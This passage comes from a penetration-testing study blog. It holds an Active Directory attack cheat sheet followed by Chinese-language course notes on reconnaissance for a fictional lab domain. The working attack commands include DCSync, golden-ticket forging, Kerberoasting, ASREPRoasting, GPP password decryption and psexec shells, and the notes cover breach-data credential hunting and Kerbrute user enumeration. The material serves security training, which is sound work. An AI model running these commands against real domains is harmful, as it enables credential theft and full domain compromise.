(<code>-hashes</code>). Performed from a Linux-based host.</td></tr><tr><td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td><td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt</code></td><td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Miscellaneous-Misconfigurations"><a href="#Miscellaneous-Misconfigurations" class="headerlink" title="Miscellaneous Misconfigurations"></a>Miscellaneous Misconfigurations</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module .\SecurityAssessment.ps1</code></td><td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></td><td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5</code></td><td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td></tr><tr><td><code>adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r</code></td><td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td></tr><tr><td><code>Get-DomainUser * | Select-Object samaccountname,description </code></td><td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></td><td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts</code></td><td>Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Group-Policy-Enumeration-amp-Attacks"><a href="#Group-Policy-Enumeration-amp-Attacks" class="headerlink" title="Group Policy Enumeration &amp; Attacks"></a>Group Policy Enumeration &amp; Attacks</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td><td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb -L | grep gpp</code></td><td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td><td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td></tr><tr><td><code>Get-DomainGPO | select displayname</code></td><td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>Get-GPO -All | Select DisplayName</code></td><td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td></tr><tr><td><code>$sid=Convert-NameToSid &quot;Domain Users&quot; </code></td><td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainGPO | Get-ObjectAcl | ?&#123;$_.SecurityIdentifier -eq $sid</code></td><td>PowerView tool that is used to check if the <code>Domain Users</code>  (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td></tr><tr><td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td><td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl</code></td><td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td></tr><tr><td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td><td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td></tr><tr><td><code>hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt </code></td><td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td></tr><tr><td><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </code></td><td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don’t require Kerberos pre-authentication. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="Trust-Relationships-Child-gt-Parent-Trusts"><a href="#Trust-Relationships-Child-gt-Parent-Trusts" class="headerlink" title="Trust Relationships - Child &gt; Parent Trusts"></a>Trust Relationships - Child &gt; Parent Trusts</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Import-Module activedirectory</code></td><td>Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.</td></tr><tr><td><code>Get-ADTrust -Filter *</code></td><td>PowerShell cmd-let used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrust </code></td><td>PowerView tool used to enumerate a target Windows domain’s trust relationships. Performed from a Windows-based host.</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></td><td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td><td>Uses Mimikatz to obtain the <code>KRBTGT</code> account’s <code>NT Hash</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainSID</code></td><td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td></tr><tr><td><code>Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity &quot;Enterprise Admins&quot; | select distinguishedname,objectsid</code></td><td>PowerView tool used to obtain the <code>Enterprise Admins</code> group’s SID from a Windows-based host.</td></tr><tr><td><code>ls \\academy-ea-dc01.inlanefreight.local\c$</code></td><td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td></tr><tr><td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td><td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td></tr><tr><td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td><td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td></tr><tr><td><code>mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm</code></td><td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td></tr><tr><td><code>secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td><td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 </code></td><td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep &quot;Domain SID&quot;</code></td><td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td></tr><tr><td><code>lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 &quot;Enterprise Admins&quot;</code></td><td>Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group’s <code>RID</code> from a Linux-based host.</td></tr><tr><td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td><td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td></tr><tr><td><code>export KRB5CCNAME=hacker.ccache</code></td><td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td></tr><tr><td><code>psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></td><td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td></tr><tr><td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></td><td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td></tr></tbody></table><h1 id="Trust-Relationships-Cross-Forest"><a href="#Trust-Relationships-Cross-Forest" class="headerlink" title="Trust Relationships - Cross-Forest"></a>Trust Relationships - Cross-Forest</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</code></td><td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td></tr><tr><td><code>Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</code></td><td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td></tr><tr><td><code> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td><td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:FREIGHTLOGISTICS.local</code>) from a Windows-based host.</td></tr><tr><td><code>Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</code></td><td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td></tr><tr><td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator</code></td><td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td></tr><tr><td><code>GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</code></td><td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td></tr><tr><td><code>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td><td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>zip -r ilfreight_bh.zip *.json</code></td><td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> cheat_sheet </tag>
            
            <tag> AD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AD</title>
      <link href="/2023/09/23/AD/"/>
      <url>/2023/09/23/AD/</url>
      
        <content type="html"><![CDATA[<ul><li>Sniffing out a Foothold</li><li>Initial Enumeration</li><li>Sniffing out a Foothold</li></ul><span id="more"></span><h3 id="External-Information-Gathering-Passive-Checks"><a href="#External-Information-Gathering-Passive-Checks" class="headerlink" title="External Information Gathering (Passive Checks)"></a>External Information Gathering (Passive Checks)</h3><p>外部信息收集被授权证明与可以从互联网上收集的有关公司的信息相关的风险。</p><h3 id="Internal-Testing"><a href="#Internal-Testing" class="headerlink" title="Internal Testing"></a>Internal Testing</h3><p>内部评估部分旨在通过尝试模拟Inlanefreight运营区域内的攻击向量来证明与内部主机和服务（特别是Active Directory）上的漏洞相关的风险。这一结果将使Inlanefright能够评估内部漏洞的风险以及成功利用漏洞的潜在影响。 </p><h3 id="Password-Testing"><a href="#Password-Testing" class="headerlink" title="Password Testing"></a>Password Testing</h3><p>从Inlanefreight设备捕获或由组织提供的密码文件可以加载到离线工作站上进行解密，并用于获得进一步的访问权限和实现评估目标。</p><h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><h2 id="What-Are-We-Looking-For"><a href="#What-Are-We-Looking-For" class="headerlink" title="What Are We Looking For?"></a>What Are We Looking For?</h2><p>在进行外部侦察时，我们应该寻找几个关键项目。这些信息可能并不总是公开的，但谨慎的做法是看看有什么。如果我们在渗透测试中陷入困境，回顾通过被动侦察可以获得的信息可以给我们前进所需的推动力，例如可以用于访问VPN或其他面向外部的服务的密码泄露数据。下表强调了我们在参与的这一阶段将寻找的“内容”。</p><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>IP Space</code></td><td>Valid ASN for our target, netblocks in use for the organization’s public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.</td></tr><tr><td><code>Domain Information</code></td><td>Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS&#x2F;IDS in use, etc.)</td></tr><tr><td><code>Schema Format</code></td><td>Can we discover the organization’s email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.</td></tr><tr><td><code>Data Disclosures</code></td><td>For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain <code>intranet</code> site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)</td></tr><tr><td><code>Breach Data</code></td><td>Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.</td></tr></tbody></table><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>DNS是验证我们的范围并了解客户在其范围界定文档中未披露的可访问主机的好方法。像 <a href="https://whois.domaintools.com/">domaintools</a>,和 <a href="https://viewdns.info/">viewdns.info</a>这样的网站是很好的起点。我们可以取回许多记录和其他数据，从DNS解析到DNSSEC测试，以及该网站是否可以在更受限制的国家&#x2F;地区访问。有时我们可能会发现超出范围的其他主机，但看起来很有趣。在这种情况下，我们可以将此列表带给我们的客户，看看是否确实应该将其中任何一个包含在范围内。我们可能还会发现一些有趣的子域，它们没有在范围界定文档中列出，但位于范围内的IP地址上，因此是公平的。</p><h3 id="Public-Data"><a href="#Public-Data" class="headerlink" title="Public Data"></a>Public Data</h3><p>社交媒体可能是一个有趣数据的宝库，这些数据可以为我们提供组织结构、运营何种设备、潜在的软件和安全实施、架构等方面的线索。排名第一的是与工作相关的网站，如LinkedIn、Indeed.com和Glassdoor。简单的招聘信息往往能揭示一家公司的很多情况。</p><p>现在让我们尝试另一种方法来验证结果中的两个名称服务器。</p><pre><code class="shell-session">[!bash!]$ nslookup ns1.inlanefreight.comServer:192.168.186.1Address:192.168.186.1#53Non-authoritative answer:Name:ns1.inlanefreight.comAddress: 178.128.39.165nslookup ns2.inlanefreight.comServer:192.168.86.1Address:192.168.86.1#53Non-authoritative answer:Name:ns2.inlanefreight.comAddress: 206.189.119.186 </code></pre><p><code>#53</code>是指DNS查询的默认端口</p><p>我们现在有两个新的IP地址要添加到我们的列表中进行验证和测试。在对他们采取任何进一步行动之前，请确保他们在您的测试范围内。出于我们的目的，实际的IP地址不在扫描范围内，但我们可以被动地浏览任何网站来寻找有趣的数据。目前，这就是从DNS中枚举域信息的方法。让我们来看看公开的信息。 Inlanefreight是一家虚构的公司，我们正在使用该模块，因此没有真正的社交媒体存在。然而，如果它是真实的，我们会查看LinkedIn、Twitter、Instagram和Facebook等网站，以获取有用的信息。相反，我们将继续查看inlanefreight.com网站。 我们进行的第一次检查是查找任何文档。使用filetype:pdf-inurl:inlanefreight.com作为搜索，我们正在寻找pdf。</p><h4 id="Hunting-For-Files"><a href="#Hunting-For-Files" class="headerlink" title="Hunting For Files"></a>Hunting For Files</h4><p><img src="https://academy.hackthebox.com/storage/modules/143/google-dorks.png" alt="image"></p><p>弹出了一个文档，所以我们需要确保记下该文档及其位置，并在本地下载一份副本进行挖掘。当我们遇到或生成文件时，最好保存文件、屏幕截图、扫描输出、工具输出等。这有助于我们保持尽可能全面的记录，而不会忘记我们在哪里看到的东西或丢失关键数据。接下来，让我们查找我们能找到的任何电子邮件地址。</p><h4 id="Hunting-E-mail-Addresses"><a href="#Hunting-E-mail-Addresses" class="headerlink" title="Hunting E-mail Addresses"></a>Hunting E-mail Addresses</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231609116.png" alt="image"></p><p>使用dork</p><p> intext：“@inlanefreight.com”inurl:inlanefreightcom，我们正在寻找任何与网站上电子邮件地址结尾相似的实例。一个很有希望的结果出现了一个联系人页面。当我们查看页面（如下图所示）时，我们可以看到一个庞大的员工列表和他们的联系信息。这些信息可能会有所帮助，因为我们可以确定这些人至少很可能是活跃的，并且仍在公司工作。</p><h4 id="E-mail-Dork-Results"><a href="#E-mail-Dork-Results" class="headerlink" title="E-mail Dork Results"></a>E-mail Dork Results</h4><p>浏览联系人页面 <a href="https://www.inlanefreight.com/index.php/contact/">contact page</a>，我们可以看到全球不同办公室员工的几封电子邮件。我们现在已经了解了他们的电子邮件命名约定（first.last）以及一些人在组织中的工作地点。这可能在以后的密码喷射攻击中很方便，或者如果社会工程&#x2F;网络钓鱼是我们参与范围的一部分。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309231611087.png" alt="image-20230923161131052"></p><h4 id="Username-Harvesting"><a href="#Username-Harvesting" class="headerlink" title="Username Harvesting"></a>Username Harvesting</h4><p>我们可以使用 <a href="https://github.com/initstring/linkedin2username">linkedin2username</a>等工具从公司的LinkedIn页面中抓取数据，并创建各种用户名的混搭（flast、first.last、f.last等），这些用户名可以添加到我们的潜在密码喷洒目标列表中。</p><h4 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h4><p><a href="http://dehashed.com/">Dehashed</a> </p><p>凭证搜寻 Dehashed是一个很好的工具，可以在漏洞数据中查找明文凭据和密码哈希。我们可以在网站上搜索，也可以使用通过API执行查询的脚本。通常，我们会为那些不在使用AD auth（或内部）的面向外部的门户网站上工作的用户找到许多旧密码，但我们可能会很幸运！这是另一个可用于创建外部或内部密码喷涂用户列表的工具。 注：出于我们的目的，下面的示例数据是虚构的。</p><h1 id="Initial-Enumeration-of-the-Domain"><a href="#Initial-Enumeration-of-the-Domain" class="headerlink" title="Initial Enumeration of the Domain"></a>Initial Enumeration of the Domain</h1><p>以下是我们此时应该寻找的一些关键数据点，并记在我们选择的笔记工具中，并尽可能将扫描&#x2F;工具输出保存到文件中。</p><h4 id="Key-Data-Points"><a href="#Key-Data-Points" class="headerlink" title="Key Data Points"></a>Key Data Points</h4><table><thead><tr><th><strong>Data Point</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>AD Users</code></td><td>We are trying to enumerate valid user accounts we can target for password spraying.</td></tr><tr><td><code>AD Joined Computers</code></td><td>Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.</td></tr><tr><td><code>Key Services</code></td><td>Kerberos, NetBIOS, LDAP, DNS</td></tr><tr><td><code>Vulnerable Hosts and Services</code></td><td>Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)</td></tr></tbody></table><h2 id="TTPs"><a href="#TTPs" class="headerlink" title="TTPs"></a>TTPs</h2><h3 id="Identifying-Hosts"><a href="#Identifying-Hosts" class="headerlink" title="Identifying Hosts"></a>Identifying Hosts</h3><p>花点时间侦听网络，看看发生了什么。我们可以使用Wireshark和TCPDump来“密切关注”网络，看看我们可以捕获哪些主机和类型的网络流量。如果评估方法是“黑匣子”，这尤其有用。我们注意到一些ARP请求和回复、MDNS和其他基本的第二层数据包（由于我们在交换网络上，我们仅限于当前的广播域），其中一些我们可以在下面看到。这是一个很好的开始，它为我们提供了一些关于客户网络设置的信息。</p><h4 id="Start-Wireshark-on-ea-attack01"><a href="#Start-Wireshark-on-ea-attack01" class="headerlink" title="Start Wireshark on ea-attack01"></a>Start Wireshark on ea-attack01</h4><pre><code class="shell-session"> $sudo -E wireshark</code></pre><p>使用<code>sudo -E</code>的主要目的是允许在切换用户的同时继续使用原始用户的环境配置。这在某些情况下非常有用，特别是当你需要使用原始用户的路径、别名、设置或其他环境变量来运行特定命令时。</p><p>如果我们在没有GUI的主机上（这是典型的），我们可以使用tcpdump、netcreds和NetMiner等来执行相同的功能。我们还可以使用tcpdump将捕获保存到.pcap文件，将其传输到另一个主机，然后在Wireshark中打开它。</p><pre><code class="shell-session">sudo tcpdump -i ens224 </code></pre><p>Responder是一种用于侦听、分析和毒害LLMNR、NBT-NS和MDNS请求和响应的工具。它有更多的功能，但目前，我们所使用的只是处于分析模式的工具。这将被动地侦听网络，而不会发送任何中毒的数据包。我们将在后面的章节中更深入地介绍这个工具。</p><h4 id="Starting-Responder"><a href="#Starting-Responder" class="headerlink" title="Starting Responder"></a>Starting Responder</h4><pre><code class="bash">sudo responder -I ens224 -A </code></pre><h4 id="FPing-Active-Checks"><a href="#FPing-Active-Checks" class="headerlink" title="FPing Active Checks"></a>FPing Active Checks</h4><p><a href="https://fping.org/">Fping</a> </p><p>在这里，我们将从几个标志开始fping：a显示活动的目标，s在扫描结束时打印统计数据，g从CIDR网络生成目标列表，q不显示每个目标的结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ fping -asgq 172.16.5.0/23172.16.5.5172.16.5.25172.16.5.50172.16.5.100172.16.5.125172.16.5.200172.16.5.225172.16.5.238172.16.5.240     510 targets       9 alive     501 unreachable       0 unknown addresses    2004 timeouts (waiting for response)    2013 ICMP Echos sent       9 ICMP Echo Replies received    2004 other ICMP received 0.029 ms (min round trip time) 0.396 ms (avg round trip time) 0.799 ms (max round trip time)       15.366 sec (elapsed real time)</code></pre><h4 id="Nmap-Scanning"><a href="#Nmap-Scanning" class="headerlink" title="Nmap Scanning"></a>Nmap Scanning</h4><p>现在我们有了网络中活动主机的列表，我们可以进一步枚举这些主机。我们希望确定每个主机正在运行的服务，确定域控制器和web服务器等关键主机，并确定以后要探测的潜在易受攻击的主机。随着我们对AD的关注，在进行了广泛的扫描后，我们最好关注通常伴随AD服务出现的标准协议，如DNS、SMB、LDAP和Kerberos等。下面是一个简单的Nmap扫描的快速示例。</p><pre><code class="bash">sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum</code></pre><ul><li><code>-v</code>: 启用详细输出，显示更多的信息。</li><li><code>-A</code>: 启用操作系统检测、版本检测、脚本扫描等一系列高级扫描技术。</li><li><code>-iL hosts.txt</code>: 从名为<code>hosts.txt</code>的文件中读取主机列表进行扫描。<code>hosts.txt</code>应该是一个包含要扫描的主机IP地址或主机名的文本文件。</li><li><code>-oN /home/htb-student/Documents/host-enum</code>: 将扫描结果以正常格式保存到<code>/home/htb-student/Documents/host-enum</code>文件中。</li></ul><h4 id="NMAP-Result-Highlights"><a href="#NMAP-Result-Highlights" class="headerlink" title="NMAP Result Highlights"></a>NMAP Result Highlights</h4><pre><code class="shell-session">Nmap scan report for inlanefreight.local (172.16.5.5)Host is up (0.069s latency).Not shown: 987 closed tcp ports (conn-refused)PORT     STATE SERVICE       VERSION53/tcp   open  domain        Simple DNS Plus88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL| Issuer: commonName=INLANEFREIGHT-CA| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2022-03-30T22:40:24| Not valid after:  2023-03-30T22:40:24| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920445/tcp  open  microsoft-ds?464/tcp  open  kpasswd5?593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)&lt;SNIP&gt;  3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)3389/tcp open  ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info:|   Target_Name: INLANEFREIGHT|   NetBIOS_Domain_Name: INLANEFREIGHT|   NetBIOS_Computer_Name: ACADEMY-EA-DC01|   DNS_Domain_Name: INLANEFREIGHT.LOCAL|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL|   DNS_Tree_Name: INLANEFREIGHT.LOCAL|   Product_Version: 10.0.17763|_  System_Time: 2022-04-04T15:12:45+00:00&lt;SNIP&gt;5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Service Unavailable|_http-server-header: Microsoft-HTTPAPI/2.0Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>我们的扫描为我们提供了NetBIOS和DNS使用的命名标准，我们可以看到一些主机打开了RDP，它们为我们指明了INLANEFREIGHT的主域控制器的方向。LOCAL域（ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL）。</p><h2 id="Identifying-Users"><a href="#Identifying-Users" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><h2 id="Identifying-Users-1"><a href="#Identifying-Users-1" class="headerlink" title="Identifying Users"></a>Identifying Users</h2><p><a href="https://github.com/ropnop/kerbrute">Kerbrute</a> 可以是域帐户枚举的一个更隐蔽的选项。它利用了这样一个事实，即Kerberos预身份验证失败通常不会触发日志或警报。我们将把Kerbrute与Insidetrust的jsmith.txt或jsmith2.txt用户列表结合使用。此存储库包含许多不同的用户列表，当从未经身份验证的角度开始枚举用户时，这些列表非常有用。我们可以将Kerbrute指向我们之前找到的DC，并为其提供一个单词列表。该工具很快，我们将收到结果，让我们知道找到的账户是否有效，这是发起密码喷涂等攻击的一个很好的起点，我们将在本模块稍后深入介绍。 为了开始使用Kerbrute，我们可以从Linux、Windows和Mac下载用于测试工具的预编译二进制文件，也可以自己编译。这通常是我们在客户端环境中引入的任何工具的最佳实践。要编译二进制文件以在我们选择的系统上使用，我们首先克隆repo：</p><h4 id="Cloning-Kerbrute-GitHub-Repo"><a href="#Cloning-Kerbrute-GitHub-Repo" class="headerlink" title="Cloning Kerbrute GitHub Repo"></a>Cloning Kerbrute GitHub Repo</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git</code></pre><p>键入make help将向我们显示可用的编译选项。</p><pre><code class="shell-session">Tanin@htb[/htb]$ make helphelp:            Show this help.windows:  Make Windows x86 and x64 Binarieslinux:  Make Linux x86 and x64 Binariesmac:  Make Darwin (Mac) x86 and x64 Binariesclean:  Delete any binariesall:  Make Windows, Linux and Mac x86/x64 Binaries</code></pre><p>我们可以选择只编译一个二进制文件或类型make all，并分别编译一个用于Linux、Windows和Mac系统（每个系统都有x86和x64版本）。</p><p>新创建的dist目录将包含我们编译的二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls dist/kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe</code></pre><h4 id="Testing-the-kerbrute-linux-amd64-Binary"><a href="#Testing-the-kerbrute-linux-amd64-Binary" class="headerlink" title="Testing the kerbrute_linux_amd64 Binary"></a>Testing the kerbrute_linux_amd64 Binary</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ./kerbrute_linux_amd64     __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnopThis tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accountsUsage:  